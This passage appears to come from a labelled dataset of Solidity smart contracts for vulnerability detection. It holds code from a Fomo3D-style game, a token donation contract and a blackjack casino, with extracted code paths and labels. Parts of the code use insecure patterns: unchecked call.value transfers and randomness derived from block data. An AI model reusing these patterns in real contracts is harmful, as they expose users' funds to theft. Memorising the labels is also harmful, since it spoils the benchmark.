(round_[_rID].keys.add(_keys)).ethRec(_keys) ); else return ( (_keys).eth() ); } function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff) external { require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\"); if (pIDxAddr_[_addr] != _pID) pIDxAddr_[_addr] = _pID; if (pIDxName_[_name] != _pID) pIDxName_[_name] = _pID; if (plyr_[_pID].addr != _addr) plyr_[_pID].addr = _addr; if (plyr_[_pID].name != _name) plyr_[_pID].name = _name; if (plyr_[_pID].laff != _laff) plyr_[_pID].laff = _laff; if (plyrNames_[_pID][_name] == false) plyrNames_[_pID][_name] = true; } function receivePlayerNameList(uint256 _pID, bytes32 _name) external { require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\"); if(plyrNames_[_pID][_name] == false) plyrNames_[_pID][_name] = true; } function determinePID(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns) { uint256 _pID = pIDxAddr_[msg.sender]; if (_pID == 0) { _pID = PlayerBook.getPlayerID(msg.sender); bytes32 _name = PlayerBook.getPlayerName(_pID); uint256 _laff = PlayerBook.getPlayerLAff(_pID); pIDxAddr_[msg.sender] = _pID; plyr_[_pID].addr = msg.sender; if (_name != \"\") { pIDxName_[_name] = _pID; plyr_[_pID].name = _name; plyrNames_[_pID][_name] = true; } if (_laff != 0 && _laff != _pID) plyr_[_pID].laff = _laff; _eventData_.compressedData = _eventData_.compressedData + 1; } return (_eventData_); } function verifyTeam(uint256 _team) private pure returns (uint256) { if (_team < 0 || _team > 3) return(2); else return(_team); } function managePlayer(uint256 _pID, LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns) { if (plyr_[_pID].lrnd != 0) updateGenVault(_pID, plyr_[_pID].lrnd); plyr_[_pID].lrnd = rID_; _eventData_.compressedData = _eventData_.compressedData + 10; return(_eventData_); } function endRound(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns) { uint256 _rID = rID_; uint256 _winPID = round_[_rID].plyr; uint256 _winTID = round_[_rID].team; uint256 _pot = round_[_rID].pot; uint256 _win = (_pot.mul(48)) / 100; uint256 _com = (_pot / 50); uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100; uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100; uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d); uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys); uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000); if (_dust > 0) { _gen = _gen.sub(_dust); _res = _res.add(_dust); } plyr_[_winPID].win = _win.add(plyr_[_winPID].win); if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\")))) { _p3d = _p3d.add(_com); _com = 0; } round_[_rID].mask = _ppt.add(round_[_rID].mask); _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000); _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000); _eventData_.winnerAddr = plyr_[_winPID].addr; _eventData_.winnerName = plyr_[_winPID].name; _eventData_.amountWon = _win; _eventData_.genAmount = _gen; _eventData_.P3DAmount = 0; _eventData_.newPot = _res; rID_++; _rID++; round_[_rID].strt = now; round_[_rID].end = now.add(rndInit_).add(rndGap_); round_[_rID].pot = _res; return(_eventData_); } function updateGenVault(uint256 _pID, uint256 _rIDlast) private { uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast); if (_earnings > 0) { plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen); plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask); } } function updateTimer(uint256 _keys, uint256 _rID) private { uint256 _now = now; uint256 _newTime; if (_now > round_[_rID].end && round_[_rID].plyr == 0) _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now); else _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end); if (_newTime < (rndMax_).add(_now)) round_[_rID].end = _newTime; else round_[_rID].end = rndMax_.add(_now); } function airdrop() private view returns(bool) { uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) < airDropTracker_) return(true); else return(false); } function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns) { uint256 _com = _eth / 50; uint256 _p3d; uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _com = _com.add(_aff); } address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))); return(_eventData_); } function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns) { uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100; uint256 _air = (_eth / 50); airDropPot_ = airDropPot_.add(_air); _eth = _eth.sub(((_eth.mul(14)) / 100)); uint256 _pot = _eth.sub(_gen); uint256 _dust = updateMasks(_rID, _pID, _gen, _keys); if (_dust > 0) _gen = _gen.sub(_dust); round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot); _eventData_.genAmount = _gen.add(_eventData_.genAmount); _eventData_.potAmount = _pot; return(_eventData_); } function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys) private returns(uint256) { uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys); round_[_rID].mask = _ppt.add(round_[_rID].mask); uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000); plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask); return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000))); } function withdrawEarnings(uint256 _pID) private returns(uint256) { updateGenVault(_pID, plyr_[_pID].lrnd); uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff); if (_earnings > 0) { plyr_[_pID].win = 0; plyr_[_pID].gen = 0; plyr_[_pID].aff = 0; } return(_earnings); } function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, LOLdatasets.EventReturns memory _eventData_) private { _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000); emit LOLevents.onEndTx ( _eventData_.compressedData, _eventData_.compressedIDs, plyr_[_pID].name, msg.sender, _eth, _keys, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount, _eventData_.potAmount, airDropPot_ ); } bool public activated_ = false; function activate() public { require( msg.sender == owner, \"only team just can activate\" ); require(activated_ == false, \"fomo3d already activated\"); activated_ = true; rID_ = 1; round_[1].strt = now + rndExtra_ - rndGap_; round_[1].end = now + rndInit_ + rndExtra_; } } library LOLdatasets { struct EventReturns { uint256 compressedData; uint256 compressedIDs; address winnerAddr; bytes32 winnerName; uint256 amountWon; uint256 newPot; uint256 P3DAmount; uint256 genAmount; uint256 potAmount; } struct Player { address addr; bytes32 name; uint256 win; uint256 gen; uint256 aff; uint256 lrnd; uint256 laff; } struct PlayerRounds { uint256 eth; uint256 keys; uint256 mask; uint256 ico; } struct Round { uint256 plyr; uint256 team; uint256 end; bool ended; uint256 strt; uint256 keys; uint256 eth; uint256 pot; uint256 mask; uint256 ico; uint256 icoGen; uint256 icoAvg; } struct TeamFee { uint256 gen; uint256 p3d; } struct PotSplit { uint256 gen; uint256 p3d; } } library LOLKeysCalcLong { using SafeMath for *; function keysRec(uint256 _curEth, uint256 _newEth) internal pure returns (uint256) { return(keys((_curEth).add(_newEth)).sub(keys(_curEth))); } function ethRec(uint256 _curKeys, uint256 _sellKeys) internal pure returns (uint256) { return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys)))); } function keys(uint256 _eth) internal pure returns(uint256) { return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000); } function eth(uint256 _keys) internal pure returns(uint256) { return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq()); } } interface LOLOfficalBankInterface { function deposit() external payable returns(bool); } interface LOLPlayerBookInterface { function getPlayerID(address _addr) external returns (uint256); function getPlayerName(uint256 _pID) external view returns (bytes32); function getPlayerLAff(uint256 _pID) external view returns (uint256); function getPlayerAddr(uint256 _pID) external view returns (address); function getNameFee() external view returns (uint256); function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256); function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256); function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256); } library NameFilter { function nameFilter(string _input) internal pure returns(bytes32) { bytes memory _temp = bytes(_input); uint256 _length = _temp.length; require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\"); require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\"); if (_temp[0] == 0x30) { require(_temp[1] != 0x78, \"string cannot start with 0x\"); require(_temp[1] != 0x58, \"string cannot start with 0X\"); } bool _hasNonNumber; for (uint256 i = 0; i < _length; i++) { if (_temp[i] > 0x40 && _temp[i] < 0x5b) { _temp[i] = byte(uint(_temp[i]) + 32); if (_hasNonNumber == false) _hasNonNumber = true; } else { require ( _temp[i] == 0x20 || (_temp[i] > 0x60 && _temp[i] < 0x7b) || (_temp[i] > 0x2f && _temp[i] < 0x3a), \"string contains invalid characters\" ); if (_temp[i] == 0x20) require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\"); if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39)) _hasNonNumber = true; } } require(_hasNonNumber == true, \"string cannot be only numbers\"); bytes32 _ret; assembly { _ret := mload(add(_temp, 32)) } return (_ret); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; require(c / a == b, \"SafeMath mul failed\"); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a, \"SafeMath sub failed\"); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; require(c >= a, \"SafeMath add failed\"); return c; } function sqrt(uint256 x) internal pure returns (uint256 y) { uint256 z = ((add(x,1)) / 2); y = x; while (z < y) { y = z; z = ((add((x / z),z)) / 2); } } function sq(uint256 x) internal pure returns (uint256) { return (mul(x,x)); } function pwr(uint256 x, uint256 y) internal pure returns (uint256) { if (x==0) return (0); else if (y==0) return (1); else { uint256 z = x; for (uint256 i=1; i < y; i++) z = mul(z,x); return (z); } } } "}
{"sol name": "39705.sol", "label": 0, "first path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "second path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "third path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "long path": "pragma solidity ^0.4.6; contract TokenTracker { uint public restrictedShare; mapping(address => uint) public tokens; mapping(address => uint) public restrictions; uint public totalRestrictedTokens; uint public totalUnrestrictedTokens; uint public totalRestrictedAssignments; uint public totalUnrestrictedAssignments; bool public assignmentsClosed = false; uint public burnMultDen; uint public burnMultNom; function TokenTracker(uint _restrictedShare) { if (_restrictedShare >= 100) { throw; } restrictedShare = _restrictedShare; } function isUnrestricted() constant returns (bool) { return (assignmentsClosed && totalRestrictedTokens == 0); } function multFracCeiling(uint x, uint a, uint b) returns (uint) { if (a == 0) { return 0; } return (x * a + (b - 1)) / b; } function isRegistered(address addr, bool restricted) constant returns (bool) { if (restricted) { return (restrictions[addr] > 0); } else { return (tokens[addr] > 0); } } function assign(address addr, uint tokenAmount, bool restricted) internal { if (assignmentsClosed) { throw; } tokens[addr] += tokenAmount; if (restricted) { totalRestrictedTokens += tokenAmount; totalRestrictedAssignments += 1; restrictions[addr] += tokenAmount; } else { totalUnrestrictedTokens += tokenAmount; totalUnrestrictedAssignments += 1; } } function closeAssignmentsIfOpen() internal { if (assignmentsClosed) { return; } assignmentsClosed = true; uint totalTokensTarget = (totalUnrestrictedTokens * 100) / (100 - restrictedShare); uint totalTokensExisting = totalRestrictedTokens + totalUnrestrictedTokens; uint totalBurn = 0; if (totalTokensExisting > totalTokensTarget) { totalBurn = totalTokensExisting - totalTokensTarget; } burnMultNom = totalBurn; burnMultDen = totalRestrictedTokens; } function unrestrict(address addr) internal returns (uint) { if (!assignmentsClosed) { throw; } uint restrictionsForAddr = restrictions[addr]; if (restrictionsForAddr == 0) { throw; } uint burn = multFracCeiling(restrictionsForAddr, burnMultNom, burnMultDen); tokens[addr] -= burn; delete restrictions[addr]; totalRestrictedTokens   -= restrictionsForAddr; totalUnrestrictedTokens += restrictionsForAddr - burn; return burn; } } contract Phased { uint[] public phaseEndTime; uint public N; mapping(uint => uint) public maxDelay; function getPhaseAtTime(uint time) constant returns (uint n) { if (time > now) { throw; } while (n < N && phaseEndTime[n] <= time) { n++; } } function isPhase(uint time, uint n) constant returns (bool) { if (time > now) { throw; } if (n >= N) { throw; } if (n > 0 && phaseEndTime[n-1] > time) { return false; } if (n < N && time >= phaseEndTime[n]) { return false; } return true; } function getPhaseStartTime(uint n) constant returns (uint) { if (n == 0) { throw; } return phaseEndTime[n-1]; } function addPhase(uint time) internal { if (N > 0 && time <= phaseEndTime[N-1]) { throw; } if (time <= now) { throw; } phaseEndTime.push(time); N++; } function setMaxDelay(uint i, uint timeDelta) internal { if (i >= N) { throw; } maxDelay[i] = timeDelta; } function delayPhaseEndBy(uint n, uint timeDelta) internal { if (n >= N) { throw; } if (now >= phaseEndTime[n]) { throw; } if (timeDelta > maxDelay[n]) { throw; } maxDelay[n] -= timeDelta; for (uint i = n; i < N; i++) { phaseEndTime[i] += timeDelta; } } function endCurrentPhaseIn(uint timeDelta) internal { uint n = getPhaseAtTime(now); if (n >= N) { throw; } if (timeDelta == 0) { timeDelta = 1; } if (now + timeDelta < phaseEndTime[n]) { phaseEndTime[n] = now + timeDelta; } } } contract StepFunction { uint public phaseLength; uint public nSteps; uint public step; function StepFunction(uint _phaseLength, uint _initialValue, uint _nSteps) { if (_nSteps > _phaseLength) { throw; } step = _initialValue / _nSteps; if ( step * _nSteps != _initialValue) { throw; } phaseLength = _phaseLength; nSteps = _nSteps; } function getStepFunction(uint elapsedTime) constant returns (uint) { if (elapsedTime >= phaseLength) { throw; } uint timeLeft  = phaseLength - elapsedTime - 1; uint stepsLeft = ((nSteps + 1) * timeLeft) / phaseLength; return stepsLeft * step; } } contract Targets { mapping(uint => uint) public counter; mapping(uint => uint) public target; function targetReached(uint id) constant returns (bool) { return (counter[id] >= target[id]); } function setTarget(uint id, uint _target) internal { target[id] = _target; } function addTowardsTarget(uint id, uint amount) internal returns (bool firstReached) { firstReached = (counter[id] < target[id]) && (counter[id] + amount >= target[id]); counter[id] += amount; } } contract Parameters { uint public constant round0StartTime      = 1484676000; uint public constant round1StartTime      = 1495040400; uint public constant round0EndTime        = round0StartTime + 6 weeks; uint public constant round1EndTime        = round1StartTime + 6 weeks; uint public constant finalizeStartTime    = round1EndTime   + 1 weeks; uint public constant finalizeEndTime      = finalizeStartTime + 1000 years; uint public constant maxRoundDelay     = 270 days; uint public constant gracePeriodAfterRound0Target  = 1 days; uint public constant gracePeriodAfterRound1Target  = 0 days; uint public constant tokensPerCHF = 10; uint public constant minDonation = 1 ether; uint public constant round0Bonus = 200; uint public constant round1InitialBonus = 25; uint public constant round1BonusSteps = 5; uint public constant millionInCents = 10**6 * 100; uint public constant round0Target = 1 * millionInCents; uint public constant round1Target = 20 * millionInCents; uint public constant earlyContribShare = 22; } contract FDC is TokenTracker, Phased, StepFunction, Targets, Parameters { string public name; enum state { pause, earlyContrib, round0, round1, offChainReg, finalization, done } mapping(uint => state) stateOfPhase; mapping(bytes32 => bool) memoUsed; address[] public donorList; address[] public earlyContribList; uint public weiPerCHF; uint public totalWeiDonated; mapping(address => uint) public weiDonated; address public foundationWallet; address public registrarAuth; address public exchangeRateAuth; address public masterAuth; uint phaseOfRound0; uint phaseOfRound1; event DonationReceipt (address indexed addr, string indexed currency, uint indexed bonusMultiplierApplied, uint timestamp, uint tokenAmount, bytes32 memo); event EarlyContribReceipt (address indexed addr, uint tokenAmount, bytes32 memo); event BurnReceipt (address indexed addr, uint tokenAmountBurned); function FDC(address _masterAuth, string _name) TokenTracker(earlyContribShare) StepFunction(round1EndTime-round1StartTime, round1InitialBonus, round1BonusSteps) { name = _name; foundationWallet  = _masterAuth; masterAuth     = _masterAuth; exchangeRateAuth  = _masterAuth; registrarAuth  = _masterAuth; stateOfPhase[0] = state.earlyContrib; addPhase(round0StartTime); stateOfPhase[1] = state.round0; addPhase(round0EndTime); stateOfPhase[2] = state.offChainReg; addPhase(round1StartTime); stateOfPhase[3] = state.round1; addPhase(round1EndTime); stateOfPhase[4] = state.offChainReg; addPhase(finalizeStartTime); stateOfPhase[5] = state.finalization; addPhase(finalizeEndTime); stateOfPhase[6] = state.done; phaseOfRound0 = 1; phaseOfRound1 = 3; setMaxDelay(phaseOfRound0 - 1, maxRoundDelay); setMaxDelay(phaseOfRound1 - 1, maxRoundDelay); setTarget(phaseOfRound0, round0Target); setTarget(phaseOfRound1, round1Target); } function getState() constant returns (state) { return stateOfPhase[getPhaseAtTime(now)]; } function getMultiplierAtTime(uint time) constant returns (uint) { uint n = getPhaseAtTime(time); if (stateOfPhase[n] == state.round0) { return 100 + round0Bonus; } if (stateOfPhase[n] == state.round1) { return 100 + getStepFunction(time - getPhaseStartTime(n)); } throw; } function donateAsWithChecksum(address addr, bytes4 checksum) payable returns (bool) { bytes32 hash = sha256(addr); if (bytes4(hash) != checksum) { throw ; } return donateAs(addr); } function finalize(address addr) { if (getState() != state.finalization) { throw; } closeAssignmentsIfOpen(); uint tokensBurned = unrestrict(addr); BurnReceipt(addr, tokensBurned); if (isUnrestricted()) { endCurrentPhaseIn(0); } } function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); } function getStatus(uint donationRound, address dfnAddr, address fwdAddr) public constant returns ( state currentState, uint fxRate, uint currentMultiplier, uint donationCount, uint totalTokenAmount, uint startTime, uint endTime, bool isTargetReached, uint chfCentsDonated, uint tokenAmount, uint fwdBalance, uint donated) { currentState = getState(); if (currentState == state.round0 || currentState == state.round1) { currentMultiplier = getMultiplierAtTime(now); } fxRate = weiPerCHF; donationCount = totalUnrestrictedAssignments; totalTokenAmount = totalUnrestrictedTokens; if (donationRound == 0) { startTime = getPhaseStartTime(phaseOfRound0); endTime = getPhaseStartTime(phaseOfRound0 + 1); isTargetReached = targetReached(phaseOfRound0); chfCentsDonated = counter[phaseOfRound0]; } else { startTime = getPhaseStartTime(phaseOfRound1); endTime = getPhaseStartTime(phaseOfRound1 + 1); isTargetReached = targetReached(phaseOfRound1); chfCentsDonated = counter[phaseOfRound1]; } tokenAmount = tokens[dfnAddr]; donated = weiDonated[dfnAddr]; fwdBalance = fwdAddr.balance; } function setWeiPerCHF(uint weis) { if (msg.sender != exchangeRateAuth) { throw; } weiPerCHF = weis; } function registerEarlyContrib(address addr, uint tokenAmount, bytes32 memo) { if (msg.sender != registrarAuth) { throw; } if (getState() != state.earlyContrib) { throw; } if (!isRegistered(addr, true)) { earlyContribList.push(addr); } assign(addr, tokenAmount, true); EarlyContribReceipt(addr, tokenAmount, memo); } function registerOffChainDonation(address addr, uint timestamp, uint chfCents, string currency, bytes32 memo) { if (msg.sender != registrarAuth) { throw; } uint currentPhase = getPhaseAtTime(now); state currentState = stateOfPhase[currentPhase]; if (currentState != state.round0 && currentState != state.round1 && currentState != state.offChainReg) { throw; } if (timestamp > now) { throw; } uint timestampPhase = getPhaseAtTime(timestamp); state timestampState = stateOfPhase[timestampPhase]; if ((currentState == state.round0 || currentState == state.round1) && (timestampState != currentState)) { throw; } if (currentState == state.offChainReg && timestampPhase != currentPhase-1) { throw; } if (memoUsed[memo]) { throw; } memoUsed[memo] = true; bookDonation(addr, timestamp, chfCents, currency, memo); } function delayDonPhase(uint donPhase, uint timedelta) { if (msg.sender != registrarAuth) { throw; } if (donPhase == 0) { delayPhaseEndBy(phaseOfRound0 - 1, timedelta); } else if (donPhase == 1) { delayPhaseEndBy(phaseOfRound1 - 1, timedelta); } } function setFoundationWallet(address newAddr) { if (msg.sender != masterAuth) { throw; } if (getPhaseAtTime(now) >= phaseOfRound0) { throw; } foundationWallet = newAddr; } function setExchangeRateAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } exchangeRateAuth = newAuth; } function setRegistrarAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } registrarAuth = newAuth; } function setMasterAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } masterAuth = newAuth; } function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); } function bookDonation(address addr, uint timestamp, uint chfCents, string currency, bytes32 memo) private { uint phase = getPhaseAtTime(timestamp); bool targetReached = addTowardsTarget(phase, chfCents); if (targetReached && phase == getPhaseAtTime(now)) { if (phase == phaseOfRound0) { endCurrentPhaseIn(gracePeriodAfterRound0Target); } else if (phase == phaseOfRound1) { endCurrentPhaseIn(gracePeriodAfterRound1Target); } } uint bonusMultiplier = getMultiplierAtTime(timestamp); chfCents = (chfCents * bonusMultiplier) / 100; uint tokenAmount = (chfCents * tokensPerCHF) / 100; if (!isRegistered(addr, false)) { donorList.push(addr); } assign(addr,tokenAmount,false); DonationReceipt(addr, currency, bonusMultiplier, timestamp, tokenAmount, memo); } } "}
{"sol name": "39664.sol", "label": 0, "first path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "second path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "third path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "long path": "library ArrayLib { function insertInPlace(uint8[] storage self, uint8 n) { uint8 insertingIndex = 0; while (self.length > 0 && insertingIndex < self.length && self[insertingIndex] < n) { insertingIndex += 1; } self.length += 1; for (uint8 i = uint8(self.length) - 1; i > insertingIndex; i--) { self[i] = self[i - 1]; } self[insertingIndex] = n; } } library DeckLib { using ArrayLib for uint8[]; enum Suit { Spades, Hearts, Clubs, Diamonds } uint8 constant cardsPerSuit = 13; uint8 constant suits = 4; uint8 constant totalCards = cardsPerSuit * suits; struct Deck { uint8[] usedCards; address player; uint256 gameID; } function init(Deck storage self, uint256 gameID)  { self.usedCards = new uint8[](0); self.player = msg.sender; self.gameID = gameID; } function getCard(Deck storage self, uint256 blockNumber)  returns (uint8)  { uint cardIndex = self.usedCards.length; if (cardIndex >= totalCards) throw; uint8 r = uint8(getRandomNumber(blockNumber, self.player, self.gameID, cardIndex, totalCards - cardIndex)); for (uint8 i = 0; i < cardIndex; i++) { if (self.usedCards[i] <= r) r += 1; } self.usedCards.insertInPlace(r); return r; } function cardDescription(uint8 self) constant returns (Suit, uint8) { return (Suit(self / cardsPerSuit), cardFacevalue(self)); } function cardEmojified(uint8 self) constant returns (uint8, string) { string memory emojiSuit; var (suit, number) = cardDescription(self); if (suit == Suit.Clubs) emojiSuit = \"\u2663\ufe0f\"; else if (suit == Suit.Diamonds) emojiSuit = \"\u2666\ufe0f\"; else if (suit == Suit.Hearts) emojiSuit = \"\u2665\ufe0f\"; else if (suit == Suit.Spades) emojiSuit = \"\u2660\ufe0f\"; return (number, emojiSuit); } function cardFacevalue(uint8 self) constant returns (uint8) { return 1 + self % cardsPerSuit; } function blackjackValue(uint8 self) constant returns (uint8) { uint8 cardValue = cardFacevalue(self); return cardValue < 10 ? cardValue : 10; } function getRandomNumber(uint b, address player, uint256 gameID, uint n, uint m) constant returns (uint) { bytes32 blockHash = block.blockhash(b); if (blockHash == 0x0) throw; return uint(uint256(keccak256(blockHash, player, gameID, n)) % m); } } contract AbstractBlockjackLogs { event GameEnded(uint256 gameID, address player, uint gameResult, uint256 payout, uint8 playerHand, uint8 houseHand); event GameNeedsTick(uint256 gameID, address player, uint256 actionBlock); function recordLog(uint256 gameID, address player, uint gameResult, uint256 payout, uint8 playerHand, uint8 houseHand); function tickRequiredLog(uint256 gameID, address player, uint256 actionBlock); } library GameLib { using DeckLib for *; uint8 constant houseLimit = 17; uint8 constant target = 21; enum ComparaisonResult { First, Second, Tie } enum GameState { InitialCards, Waiting, Hit, Stand, DoubleDown, Finished } enum GameResult { Ongoing, House, Tie, Player, PlayerNatural } struct Game { address player; uint256 bet; uint256 payout; uint256 gameID; DeckLib.Deck deck; uint8[] houseCards; uint8[] playerCards; uint256 actionBlock; GameState state; GameResult result; bool closed; } function init(Game storage self, uint256 gameID) { self.player = msg.sender; self.bet = msg.value; self.payout = 0; self.houseCards = new uint8[](0); self.playerCards = new uint8[](0); self.actionBlock = block.number; self.state = GameState.InitialCards; self.result = GameResult.Ongoing; self.closed = false; self.gameID = gameID; self.deck.init(gameID); } function tick(Game storage self) returns (bool) { if (block.number <= self.actionBlock) return false; if (self.actionBlock + 255 < block.number) { endGame(self, GameResult.House); return true; } if (!needsTick(self)) return true; if (self.state == GameState.InitialCards) dealInitialCards(self); if (self.state == GameState.Hit) dealHitCard(self); if (self.state == GameState.DoubleDown) { if (!canDoubleDown(self)) throw; self.bet += msg.value; dealHitCard(self); forceStand(self); } if (self.state == GameState.Stand) { dealHouseCards(self); checkGameResult(self); } else { checkGameContinues(self); } return true; } function needsTick(Game storage self) constant returns (bool) { if (self.state == GameState.Waiting) return false; if (self.state == GameState.Finished) return false; return true; } function checkGameResult(Game storage self)  { uint8 houseHand = countHand(self.houseCards); if (houseHand == target && self.houseCards.length == 2) return endGame(self, GameResult.House); ComparaisonResult result = compareHands(houseHand, countHand(self.playerCards)); if (result == ComparaisonResult.First) return endGame(self, GameResult.House); if (result == ComparaisonResult.Second) return endGame(self, GameResult.Player); endGame(self, GameResult.Tie); } function checkGameContinues(Game storage self)  { uint8 playerHand = countHand(self.playerCards); if (playerHand == target && self.playerCards.length == 2) return endGame(self, GameResult.PlayerNatural); if (playerHand > target) return endGame(self, GameResult.House); if (playerHand == target) 